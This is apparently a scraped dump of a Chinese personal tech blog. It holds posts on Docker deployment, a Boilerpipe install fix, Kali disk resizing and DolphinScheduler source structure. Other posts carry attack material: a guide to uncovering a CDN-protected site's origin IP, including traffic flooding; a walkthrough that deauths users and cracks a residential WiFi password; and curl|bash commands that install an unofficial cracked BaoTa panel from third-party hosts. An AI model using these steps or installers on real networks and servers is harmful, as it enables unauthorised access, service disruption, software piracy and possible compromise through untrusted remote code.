容器名称:容器目录 也可以将文件从容器内拷贝出来 1docker cp 容器名称:容器目录 需要拷贝的文件或目录 3.2.5 目录挂载我们可以在创建容器的时候，将宿主机的目录与容器内的目录进行映射，这样我们就可以通过修改宿主机某个目录的文件从而去影响容器。创建容器 添加-v参数 后边为 宿主机目录:容器目录，例如： 1docker run -di -v /usr/local/myhtml:/usr/local/myhtml --name=mycentos3 centos:7 如果你共享的是多级的目录，可能会出现权限不足的提示。 这是因为CentOS7中的安全模块selinux把权限禁掉了，我们需要添加参数 –privileged&#x3D;true 来解决挂载的目录没有权限的问题 3.2.6 查看容器IP地址我们可以通过以下命令查看容器运行的各种数据 1docker inspect 容器名称（容器ID） 也可以直接执行下面的命令直接输出IP地址 1docker inspect --format=&#x27;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&#x27; 容器名称（容器ID） 3.2.7 删除容器删除指定的容器： 1docker rm 容器名称（容器ID） 4 应用部署4.1 MySQL部署（1）拉取mysql镜像 1docker pull centos/mysql-57-centos7 （2）创建容器 1docker run -di --name=tensquare_mysql -p 33306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql -p 代表端口映射，格式为 宿主机映射端口:容器运行端口 -e 代表添加环境变量 MYSQL_ROOT_PASSWORD 是root用户的登陆密码 （3）远程登录mysql 连接宿主机的IP ,指定端口为33306 4.2 tomcat部署（1）拉取镜像 1docker pull tomcat:7-jre7 （2）创建容器 创建容器 -p表示地址映射 12docker run -di --name=mytomcat -p 9000:8080 -v /usr/local/webapps:/usr/local/tomcat/webapps tomcat:7-jre7 4.3 Nginx部署（1）拉取镜像 1docker pull nginx （2）创建Nginx容器 1docker run -di --name=mynginx -p 80:80 nginx 4.4 Redis部署（1）拉取镜像 1docker pull redis （2）创建容器 1docker run -di --name=myredis -p 6379:6379 redis 5 迁移与备份5.1 容器保存为镜像我们可以通过以下命令将容器保存为镜像 1docker commit mynginx mynginx_i 5.2 镜像备份我们可以通过以下命令将镜像保存为tar 文件 1docker save -o mynginx.tar mynginx_i 5.3 镜像恢复与迁移首先我们先删除掉mynginx_img镜像 然后执行此命令进行恢复 1docker load -i mynginx.tar -i 输入的文件 执行后再次查看镜像，可以看到镜像已经恢复 6 Dockerfile6.1 什么是DockerfileDockerfile是由一系列命令和参数构成的脚本，这些命令应用于基础镜像并最终创建一个新的镜像。 1、对于开发人员：可以为开发团队提供一个完全一致的开发环境；2、对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件构建一个新的镜像开始工作了；3、对于运维人员：在部署时，可以实现应用的无缝移植。 6.2 常用命令 命令 作用 FROM image_name:tag 定义了使用哪个基础镜像启动构建流程 MAINTAINER user_name 声明镜像的创建者 ENV key value 设置环境变量 (可以写多条) RUN command 是Dockerfile的核心部分(可以写多条) ADD source_dir&#x2F;file dest_dir&#x2F;file 将宿主机的文件复制到容器内，如果是一个压缩文件，将会在复制后自动解压 COPY source_dir&#x2F;file dest_dir&#x2F;file 和ADD相似，但是如果有压缩文件并不能解压 WORKDIR path_dir 设置工作目录 6.3 使用脚本创建镜像步骤： （1）创建目录 1mkdir –p /usr/local/dockerjdk8 （2）下载jdk-8u171-linux-x64.tar.gz并上传到服务器（虚拟机）中的&#x2F;usr&#x2F;local&#x2F;dockerjdk8目录 （3）创建文件Dockerfile vi Dockerfile 123456789101112131415#依赖镜像名称和IDFROM centos:7#指定镜像创建者信息MAINTAINER ITCAST#切换工作目录WORKDIR /usrRUN mkdir /usr/local/java#ADD 是相对路径jar,把java添加到容器中ADD jdk-8u171-linux-x64.tar.gz /usr/local/java/#配置java环境变量ENV JAVA_HOME /usr/local/java/jdk1.8.0_171ENV JRE_HOME $JAVA_HOME/jreENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib:$CLASSPATHENV PATH $JAVA_HOME/bin:$PATH （4）执行命令构建镜像 1docker build -t=&#x27;jdk1.8&#x27; . 注意后边的空格和点，不要省略 （5）查看镜像是否建立完成 1docker images 7 Docker私有仓库7.1 私有仓库搭建与配置（1）拉取私有仓库镜像（此步省略） 1docker pull registry （2）启动私有仓库容器 1docker run -di --name=registry -p 5000:5000 registry （3）打开浏览器 输入地址http://192.168.184.141:5000/v2/_catalog看到`{&quot;repositories&quot;:[]}` 表示私有仓库搭建成功并且内容为空 （4）修改daemon.json 1vi /etc/docker/daemon.json 添加以下内容，保存退出。 1&#123;&quot;insecure-registries&quot;:[&quot;192.168.184.141:5000&quot;]&#125; 此步用于让 docker信任私有仓库地址 （5）重启docker 服务 1systemctl restart docker 7.2 镜像上传至私有仓库（1）标记此镜像为私有仓库的镜像 1docker tag jdk1.8 192.168.184.141:5000/jdk1.8 （2）再次启动私服容器 1docker start registry （3）上传标记的镜像 1docker push 192.168.184.141:5000/jdk1.8","categories":[{"name":"Java学习","slug":"Java学习","permalink":"http://blog.ioimp.top/categories/Java%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://blog.ioimp.top/tags/Docker/"},{"name":"Java学习","slug":"Java学习","permalink":"http://blog.ioimp.top/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"微服务","slug":"微服务","permalink":"http://blog.ioimp.top/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"}]},{"title":"尝试安装Boilerpipe-py3时出现404错误","slug":"尝试安装Boilerpipe-py3时出现404错误","date":"2023-08-21T09:28:34.000Z","updated":"2023-08-21T09:31:59.404Z","comments":true,"path":"2023/08/21/尝试安装Boilerpipe-py3时出现404错误/","link":"","permalink":"http://blog.ioimp.top/2023/08/21/%E5%B0%9D%E8%AF%95%E5%AE%89%E8%A3%85Boilerpipe-py3%E6%97%B6%E5%87%BA%E7%8E%B0404%E9%94%99%E8%AF%AF/","excerpt":"","text":"问题提出Boilerpipe是一个很棒的清理网页的Java程序，我以前也用过它。我今天注意到，许多用户无法安装Python包装器版本并得到404和其他错误。 123456789101112131415161718192021C:\\Users\\COLIN\\Downloads\\boilerpipe-py3-1.2.0.0\\boilerpipe-py3-1.2.0.0&gt;python setup.pyTraceback (most recent call last): File &quot;C:\\Users\\COLIN\\Downloads\\boilerpipe-py3-1.2.0.0\\boilerpipe-py3-1.2.0.0\\setup.py&quot;, line 33, in &lt;module&gt; download_jars(datapath=DATAPATH) File &quot;C:\\Users\\COLIN\\Downloads\\boilerpipe-py3-1.2.0.0\\boilerpipe-py3-1.2.0.0\\setup.py&quot;, line 26, in download_jars urlretrieve(tgz_url, tgz_name) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 241, in urlretrieve with contextlib.closing(urlopen(url, data)) as fp: File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 216, in urlopen return opener.open(url, data, timeout) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 525, in open response = meth(req, response) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 634, in http_response response = self.parent.error( File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 563, in error return self._call_chain(*args) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 496, in _call_chain result = func(*args) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 643, in http_error_default raise HTTPError(req.full_url, code, msg, hdrs, fp)urllib.error.HTTPError: HTTP Error 404: Not Found 问题解决我也遇到了同样的问题，这是因为boilerpipe被移动了。我通过在installation tar.gz内的setup.py中将以下代码行从pypi更改为： 老行： 1tgz_url = &#x27;https://boilerpipe.googlecode.com/files/boilerpipe-&#123;0&#125;-bin.tar.gz&#x27;.format(version) 新行： 1tgz_url = &#x27;https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/boilerpipe/boilerpipe-&#123;0&#125;-bin.tar.gz&#x27;.format(version) 重新压缩整个文件夹，并在新的压缩目录上运行pip install。","categories":[{"name":"开发奇遇记","slug":"开发奇遇记","permalink":"http://blog.ioimp.top/categories/%E5%BC%80%E5%8F%91%E5%A5%87%E9%81%87%E8%AE%B0/"}],"tags":[{"name":"Boilerpipe","slug":"Boilerpipe","permalink":"http://blog.ioimp.top/tags/Boilerpipe/"},{"name":"url地址变迁","slug":"url地址变迁","permalink":"http://blog.ioimp.top/tags/url%E5%9C%B0%E5%9D%80%E5%8F%98%E8%BF%81/"},{"name":"Stack Overflow","slug":"Stack-Overflow","permalink":"http://blog.ioimp.top/tags/Stack-Overflow/"}]},{"title":"kali Linux磁盘扩容","slug":"kali-Linux磁盘扩容","date":"2023-08-18T06:30:54.000Z","updated":"2023-08-18T06:38:03.468Z","comments":true,"path":"2023/08/18/kali-Linux磁盘扩容/","link":"","permalink":"http://blog.ioimp.top/2023/08/18/kali-Linux%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/","excerpt":"","text":"在安装kali时，我们有时候会给kali分配的空间比较少。刚开始还算够用，但随着软件的不断安装和系统的更新。这时我们之前分配的空间就显得不足了。那该怎样扩容你的磁盘呢？首先我们查看当前磁盘占有率 终端执行命令！ df -h 编辑切换为居中 可以看到，目前我们已经占有了58%，&#x2F;便是我们的根目录。 😘增加磁盘在vmware虚拟机中，选择编辑虚拟机设置&gt;磁盘&gt;扩展 设置最大磁盘大小，这里我的磁盘也比较有限，设置60G 然后重新启动Kali linux虚拟机，会发现磁盘的容量并没有增加，这里是因为我们没有对其进行挂载。我们使用kali中的磁盘管理工具进行挂载，执行下面的命令。 这时候，我们可以看到有15G没有分配的空间。这便是刚才扩容的部分。 停用SWAP空间 先将未分配的15G给到extended上，选择extended右键调整大小。向右拖到可以调整大小。 然后移动linux-swap的位置 这里注意是点击白色的部分，向右移动到最后。 点击调整大小移动后点击确定 再次选择extended，调整大小&#x2F;移动，向右拖动将里面的空间全给出去。 对齐到需要选择柱面，然后保存 现在我们来调整&#x2F;dev&#x2F;sda1分区的大小。向右拖动就行了。 最后点击保存 现在我们来看看 已经成功了。 原理我们是不能直接给&#x2F;dev&#x2F;sda1分区调整大小的。只能通过swap（交换空间）进行中转。然后再调整&#x2F;dev&#x2F;sda1分区的大小就行了。最后一定要记得保存哦！ https://www.bilibili.com/read/cv19163012 出处：bilibili","categories":[{"name":"实用技巧","slug":"实用技巧","permalink":"http://blog.ioimp.top/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"磁盘分区","slug":"磁盘分区","permalink":"http://blog.ioimp.top/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/"},{"name":"kali-linux","slug":"kali-linux","permalink":"http://blog.ioimp.top/tags/kali-linux/"}]},{"title":"部署CDN的网站找真实IP","slug":"部署CDN的网站找真实IP","date":"2023-08-15T14:40:26.000Z","updated":"2023-08-15T16:05:36.829Z","comments":true,"path":"2023/08/15/部署CDN的网站找真实IP/","link":"","permalink":"http://blog.ioimp.top/2023/08/15/%E9%83%A8%E7%BD%B2CDN%E7%9A%84%E7%BD%91%E7%AB%99%E6%89%BE%E7%9C%9F%E5%AE%9EIP/","excerpt":"","text":"部署CDN的网站找真实IP1. 概述目前很多网站使用了cdn服务，用了此服务 可以隐藏服务器的真实IP，加速网站静态文件的访问，而且你请求网站服务时，cdn服务会根据你所在的地区，选择合适的线路给予你访问，由此达网站加速的效果，cdn不仅可以加速网站访问，还可以提供waf服务，如防止cc攻击，SQL注入拦截等多种功能，再说使用cdn的成本不太高，很多云服务器也免费提供此服务。在进行黑盒测试的时候，往往成了拦路石，所以掌握cdn找真实ip成了不得不掌握的一项技术。 2. 判断是否CDNping 域名 使用超级ping http://ping.chinaz.com/ http://ping.aizhan.com/ https://www.17ce.com/ http://ping.chinaz.com/www.t00ls.net 不同的地区访问有着不同的IP，这样就确定了该域名使用了cdn了。 3. 找真实IP的方法集合找到真实IP可以继续旁站检测，找其他站点进行突破，也可以绕过cdn进行访问，从而绕过waf针对攻击语句的拦截 发现有攻击语句就会对攻击的IP封堵。 3.1. dns历史绑定记录通过以下这些网站可以访问dns的解析，有可能存在未有绑cdn之前的记录。 https://dnsdb.io/zh-cn/ ###DNS查询 https://x.threatbook.cn/ ###微步在线 http://viewdns.info/ ###DNS、IP等查询 https://tools.ipip.net/cdn.php ###CDN查询IP https://sitereport.netcraft.com/?url=域名 查询WWW.T00Ls.net的历史记录 https://site.ip138.com/www.t00ls.net/ 3.2. 子域名解析通过子域名的解析指向 也有可能指向目标的同一个IP上。 使用工具对其子域名进行穷举 在线子域名查询 https://securitytrails.com/list/apex_domain/t00ls.net http://tool.chinaz.com/subdomain/t00ls.net https://phpinfo.me/domain/ 找到子域名继续确认子域名没有cdn的情况下批量进行域名解析查询，有cdn的情况继续查询历史。 域名批量解析 http://tools.bugscaner.com/domain2ip.html 3.3. 国外dns获取真实IP部分cdn只针对国内的ip访问，如果国外ip访问域名 即可获取真实IP 全世界DNS地址： http://www.ab173.com/dns/dns_world.php https://dnsdumpster.com/ https://dnshistory.org/ http://whoisrequest.com/history/ https://completedns.com/dns-history/ http://dnstrails.com/ https://who.is/domain-history/ http://research.domaintools.com/research/hosting-history/ http://site.ip138.com/ http://viewdns.info/iphistory/ https://dnsdb.io/zh-cn/ https://www.virustotal.com/ https://x.threatbook.cn/ http://viewdns.info/ http://www.17ce.com/ http://toolbar.netcraft.com/site_report?url= https://securitytrails.com/ https://tools.ipip.net/cdn.php 3.4. ico图标通过空间搜索找真实iphttps://www.t00ls.net/favicon.ico 下载图标 放到fofa识别 通过fofa搜图标 通过这样查询 快速定位资源 查看端口是否开放 这里没有开放 通过zoomeye搜图标 查看端口开放情况 绑定hosts进行测试 这应该是真实ip了。 3.5. fofa搜索真实IPdomain&#x3D;”t00ls.net” 302一般是cdn 3.6. 通过censys找真实ipCensys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，能够扫描整个互联网，Censys会将互联网所有的ip进行扫面和连接，以及证书探测。 若目标站点有https证书，并且默认虚拟主机配了https证书，我们就可以找所有目标站点是该https证书的站点。 通过协议查询 https://censys.io/ipv4?q=((www.t00ls.net) AND protocols: “443&#x2F;https”) AND tags.raw: “https”&amp; 443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:moonsec.com 3.7. 360测绘中心https://quake.360.cn 3.8. 利用SSL证书寻找真实IP证书颁发机构(CA)必须将他们发布的每个SSL&#x2F;TLS证书发布到公共日志中，SSL&#x2F;TLS证书通常包含域名、子域名和电子邮件地址。因此SSL&#x2F;TLS证书成为了攻击者的切入点。 获取网站SSL证书的HASH再结合Censys 利用Censys搜索网站的SSL证书及HASH，在https://crt.sh上查找目标网站SSL证书的HASH 再用Censys搜索该HASH即可得到真实IP地址 SSL证书搜索引擎： https://censys.io/ipv4?q=b6bce7fb8f7723ea63c6d0419e7af1f780d6b6cb1b4c2240e657f029142e2aae https://censys.io/certificates?q=parsed.names%3A+t00ls.net+and+tags.raw%3A+trusted 找到hash 转成ipv4 进行搜索 找到两个IP 两个ip 222.186.129.100 118.184.255.28 或者把hash放进网络空间搜索 7489210725011808154949879630532736653 成功找到网络IP 接着就是判断ip是否是这个域名的了。 3.9. 邮箱获取真实IP网站在发信的时候，会附带真实的IP地址 进入邮箱 查看源文件头部信息 选择from 是否真实 还需要 邮箱发送是否与网站同一个IP地址。 3.10. 网站敏感文件获取真实IP 文件探针 phpinfo 网站源代码 信息泄露 GitHub信息泄露 js文件 3.11. F5 LTM解码法当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取， 例如：Set-Cookie: BIGipServerpool_8.29_8030&#x3D;487098378.24095.0000，先把第一小 节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前， 以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就 是最后的真实ip。 rverpool-cas01&#x3D;3255675072.20480.0000; path&#x3D;&#x2F; 3255675072 转十六进制 c20da8c0 从右向左取 c0a80dc2 转10进制 192 168 13 194 3.12. APP获取真实IP如果网站有app，使用Fiddler或BurpSuite抓取数据包 可能获取真实IP 模拟器 mimi模拟器抓包 3.13. 小程序获取真实IP3.14. 配置不当获取真实IP在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。 案例1：为了方便用户访问，我们常常将test.com 和 test.com 解析到同一个站点，而CDN只配置了www.test.com，通过访问test.com，就可以绕过 CDN 了。 案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。 3.15. banner获取目标站点的banner，在全网搜索引擎搜索，也可以使用AQUATONE，在Shodan上搜索相同指纹站点。 可以通过互联网络信息中心的IP数据，筛选目标地区IP，遍历Web服务的banner用来对比CDN站的banner，可以确定源IP。 欧洲： http://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest 北美： https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest 亚洲： ftp://ftp.apnic.net/public/apnic/stats/apnic/delegated-apnic-latest 非洲： ftp://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-latest 拉美： ftp://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest 获取CN的IP http://www.ipdeny.com/ipblocks/data/countries/cn.zone 例如： 找到目标服务器 IP 段后，可以直接进行暴力匹配 ，使用zmap、masscan 扫描 HTTP banner，然后匹配到目标域名的相同 banner zmap -p 80 -w bbs.txt -o 80.txt 使用zmap的banner-grab对扫描出来80端口开放的主机进行banner抓取。 cat &#x2F;root&#x2F;bbs.txt |.&#x2F;banner-grab-tcp -p 80 -c 100 -d http-req -f ascii &gt; http-banners.out 根据网站返回包特征，进行特征过滤 location: plugin.php?id&#x3D;info:index https://fofa.so/ title&#x3D;”T00LS | 低调求发展 - 潜心习安全 - T00ls.Net” https://www.zoomeye.org/ title:”T00LS | 低调求发展 -潜心习安全 -T00ls.Net” https://quake.360.cn/ response:”T00LS | 低调求发展 - 潜心习安全 - T00ls.Net” 1、ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。https://github.com/zmap/zmap 2、Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。 https://github.com/robertdavidgraham/masscan 3.16. 长期关注在长期渗透的时候，设置程序每天访问网站，可能有新的发现。每天零点 或者业务需求增大 它会换ip 换服务器的。 3.17. 流量攻击发包机可以一下子发送很大的流量。 这个方法是很笨，但是在特定的目标下渗透，建议采用。 cdn除了能隐藏ip，可能还考虑到分配流量， 不设防的cdn 量大就会挂，高防cdn 要大流量访问。 经受不住大流量冲击的时候可能会显示真实ip。 站长-&gt;业务不正常-&gt;cdn不使用-&gt;更换服务器。 3.18. 被动获取被动获取就是让服务器或网站主动连接我们的服务器，从而获取服务器的真实IP 如果网站有编辑器可以填写远程url图片，即可获取真实IP 如果存在ssrf漏洞 或者xss 让服务器主动连接我们的服务器 均可获取真实IP。 3.19. 扫全网获取真实IPhttps://github.com/superfish9/hackcdn https://github.com/boy-hack/w8fuckcdn","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网安","slug":"网安","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"},{"name":"渗透必知必会","slug":"渗透必知必会","permalink":"http://blog.ioimp.top/tags/%E6%B8%97%E9%80%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"}]},{"title":"宝塔面板企业版","slug":"宝塔面板企业版","date":"2023-08-07T05:44:37.000Z","updated":"2023-08-07T05:49:16.217Z","comments":true,"path":"2023/08/07/宝塔面板企业版/","link":"","permalink":"http://blog.ioimp.top/2023/08/07/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E4%BC%81%E4%B8%9A%E7%89%88/","excerpt":"","text":"从外部引入脚本 测试可用 自行辨别安全 安装脚本和升级脚本自己看实际情况使用 宝塔企业版介绍 · 安全：剥离了所有与宝塔官方的通信、上报、下发；并且不与本站企业版服务器通信； · 免费：提升为企业会员，免费使用软件商店中的所有[企业版插件]、[专业版插件]、[运行环境]、[免费插件]、[宝塔插件]；部分[第三方应用]安装可能会失败； · 解决方案：所有功能与原版一致，如有任何问题请参考宝塔官方解决方案；或前往交流群交流！ · 面板修复：企业版不与官方通信，也没有与我们服务器通信，所以无法判断贵站情况，建议使用升级代码修复&#x2F;或安装宝塔官方版再安装企业版(小概率出现异常，大概率只重装面板不影响网站运行)； · 其他提示：如果发现[软件商店]空白，大多是服务器与你本地的网络问题，请清理本地缓存&#x2F;切换浏览器的访客模式访问&#x2F;切换本地代理IP； · 本站声明：企业版基于官方代码、仅做通信剥离、代码未加密、未添加任何新增代码！ 宝塔企业版面板：新环境新服务器（也是就什么都没装的使用下面命令安装）已安装朋友请直接跳过往下看！ 官方最新版7.9版本，安装脚本（来源宝塔官方）： 教程环境使用的是CentOS 7.9 安装命令：1234567891011121314151617181920212223242526272829Centos安装命令（默认安装是7.8.0 直接在线升级7.9.3）：主节点：yum install -y wget &amp;&amp; wget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; sh install.sh 海外节点专用：yum install -y wget &amp;&amp; wget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; sh install.sh 试验性Centos/Ubuntu/Debian安装命令 独立运行环境（py3.7） 可能存在少量兼容性问题 不断优化中主节点：curl -sSO http://io.bt.sy/install/install_panel.sh &amp;&amp; bash install_panel.sh 海外节点专用：curl -sSO http://io.yu.al/install/install_panel.sh &amp;&amp; bash install_panel.sh Ubuntu Deepin安装命令：主节点：wget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh 海外节点专用：wget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh Debian安装命令：主节点：wget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh 海外节点专用：wget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh Fedora安装命令:主节点：wget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; bash install.sh 海外节点专用：wget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; bash install.sh[/van-wechat-hide] 升级教程：1.首先升级到官方最新版7.9版本，升级脚本（来源宝塔官方）： 1curl https://download.bt.cn/install/update_panel.sh|bash 升级命令1 Linux面板 7.9.3 升级企业版命令 1（7.9.3 官方版 &#x2F; 7.7.0 开心版 可以执行这个升级到 7.9.3 开心版）： 123456789101112131415161718主节点：curl https://io.bt.sy/install/update_panel.sh|bash海外节点专用：curl https://io.yu.al/install/update_panel.sh|bash升级命令2Linux面板 7.9.3 升级企业版命令 2（7.9.3 官方版 / 7.7.0 开心版 可以执行这个升级到 7.9.3 开心版）：主节点：curl http://io.bt.sy/install/update6.sh|bash海外节点专用：curl http://io.yu.al/install/update6.sh|bash[/van-wechat-hide]以上升级命令都可以升级最新版！ 至此安装完成，我们进入宝塔面板，按住Ctrl+f5刷新，多刷新几次或等待一两分钟即可。 7.9.0开心版更新记录：系统工具：日志清理工具增加2.0版本！ 宝塔插件：堡塔网站加速增加4.2版本！ 专业版插件：网站监控报表增加6.8版本！ 企业版插件：堡塔防提权改名堡塔防入侵！ 企业版插件：堡塔限制访问型证书-Linux版增加1.2版本！ 第三方插件：Nginx免费防火墙更新6.3版本！ 第三方插件：百度网盘更新3.9版本！ 部分第三方插件已经全部更新同步官方！ 修复第三方插件百度网盘无法使用问题！ 修复已知道的一些插件到期的问题！ 修复第一次安装脚本，需要退出登录重登才能安装插件的逻辑问题！ 修复部分用户登录虚拟账户无法获取列表authlist空白的问题！ 修复危险级别：特高去除宝塔因为账户跟宝塔不匹配封ban用户ip风险的问题（导致恢复免费版也无法使用，只能降级7.7.0才能使用）！ 已支持Arm构架！！！","categories":[{"name":"网站搭建","slug":"网站搭建","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"宝塔面板","slug":"宝塔面板","permalink":"http://blog.ioimp.top/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/"}]},{"title":"记一次对小区wifi渗透","slug":"my-first-blog","date":"2023-08-03T13:43:26.000Z","updated":"2023-08-03T13:49:56.399Z","comments":true,"path":"2023/08/03/my-first-blog/","link":"","permalink":"http://blog.ioimp.top/2023/08/03/my-first-blog/","excerpt":"","text":"wifi渗透(一)第三步——检查并开启网卡的监听功能airmon-ng：检查网卡是否支持监听功能的 airmon-ng start wlan0mon ：激活无线网卡的监听模式 第四步——扫描周边wifi信号airodump-ng wlan0mon ：扫描当前周边环境的WiFi信号 注意：找到你要破解的wifi信息，记住它的BSSID和CH,后面要用！ 第五步——抓包下面里的部分信息根据自己的情况进行替换 抓包命令：airodump-ng -c &#x3D;&#x3D;CH号码&#x3D;&#x3D; –bssid &#x3D;&#x3D;BSSID号码&#x3D;&#x3D; -w &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake wlan0mon 注意： 1-w后接抓包后得到的文件保存路径和名称，注意路径！ 我的用户名是kali，你的填你自己的 注：这种方式是一种被动等待的方式，所以我们需要将链接在该wifi上的设备踢下线，以便我们快速抓包。 这里我们需要记下BSSID(WIFI路由地址)和STATION（链接设备号），接下来我们将该设备从该wifi链接状态下强制踢下线 第六步——打掉连接ACK 死亡攻击：aireplay-ng -0 10 -a BSSID号 -c STATION号 wlan0mon 110——是攻击次数，一般10次就足够我们抓到包了，如果将次数调整的很大，那么就会持续的进行攻击，导致该设备长期无法链接到该wifi! 注：这样做将会导致连接在该wifi上的设备被强制下线，然后因为wifi的自动重连机制，使得我们可以快速抓到包。 最后一步——破解破解语法：aircrack-ng -w &lt;指定字典&gt; -b &lt;目的路由MAC地址&gt; &lt;抓到的握手包&gt; 注：目的路由MAC地址——就是BSSID 抓到的握手包——cap文件 kali自带字典：aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap 需要先解压：gzip -d &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz 自我指定字典：aircrack-ng -w &#x2F;home&#x2F;kali&#x2F;password.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap 成功！ 破解的wifi密码就为a123456789","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网安","slug":"网安","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"}]},{"title":"一次对dolphinscheduler的源码分析","slug":"一次对dolphinscheduler的源码分析","date":"2023-07-20T01:05:10.000Z","updated":"2023-08-04T01:42:34.318Z","comments":true,"path":"2023/07/20/一次对dolphinscheduler的源码分析/","link":"","permalink":"http://blog.ioimp.top/2023/07/20/%E4%B8%80%E6%AC%A1%E5%AF%B9dolphinscheduler%E7%9A%84%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"dolphinscheduler学习DolphinScheduler 项目结构2.1 结构分析 导入项目后，可以看到其主要核心模块如下： 模块 描述 dolphinscheduler-alert 告警模块，提供 AlertServer 服务。 dolphinscheduler-api web应用模块，提供 ApiServer 服务。 dolphinscheduler-common 通用的常量枚举、工具类、数据结构或者基类 dolphinscheduler-dao 提供数据库访问等操作。 dolphinscheduler-remote 基于 netty 的客户端、服务端 dolphinscheduler-server MasterServer 和 WorkerServer 服务 dolphinscheduler-service service模块，包含Quartz、Zookeeper、日志客户端访问服务，便于server模块和api模块调用 dolphinscheduler-ui 前端模块 2.2 表分析 dolphinscheduler_ddl.sql及dolphinscheduler_dml.sql 执行完后，可以在数据库里看到有如下表： 表名 表信息 t_ds_access_token 访问ds后端的token t_ds_alert 告警信息 t_ds_alertgroup 告警组 t_ds_command 执行命令 t_ds_datasource 数据源 t_ds_error_command（核心表） 错误命令 t_ds_process_definition（核心表） 流程定义 t_ds_process_instance（核心表） 流程实例 t_ds_project 项目 t_ds_queue 队列 t_ds_relation_datasource_user 用户关联数据源 t_ds_relation_process_instance 子流程 t_ds_relation_project_user 用户关联项目 t_ds_relation_resources_user 用户关联资源 t_ds_relation_udfs_user 用户关联UDF函数 t_ds_relation_user_alertgroup 用户关联告警组 t_ds_resources 资源文件 t_ds_schedules（核心表） 流程定时调度 t_ds_session 用户登录的session t_ds_task_instance（核心表） 任务实例 t_ds_tenant 租户 t_ds_udfs UDF资源 t_ds_user 用户 t_ds_version ds版本信息 2.2.1 类关系图 （用户&#x2F;队列&#x2F;数据源） DS 描述如下： 一个租户下可以有多个用户； t_ds_user中的queue字段存储的是队列表中的queue_name信息; t_ds_tenant下存的是queue_id，在流程定义执行过程中，用户队列优先级最高，用户队列为空则采用租户队列； t_ds_datasource表中的user_id字段表示创建该数据源的用户; t_ds_relation_datasource_user中的user_id表示，对数据源有权限的用户。 2.2.2 类关系图 （项目&#x2F;资源&#x2F;告警） DS 描述如下： 一个用户可以有多个项目，用户项目授权通过t_ds_relation_project_user表完成project_id和user_id的关系绑定； t_ds_projcet表中的user_id表示创建该项目的用户； t_ds_relation_project_user表中的user_id表示对项目有权限的用户； t_ds_resources表中的user_id表示创建该资源的用户； t_ds_relation_resources_user中的user_id表示对资源有权限的用户； t_ds_udfs表中的user_id表示创建该UDF的用户； t_ds_relation_udfs_user表中的user_id表示对UDF有权限的用户。 2.2.3 类关系图 （ 命令&#x2F;流程&#x2F;任务） DS 描述如下： 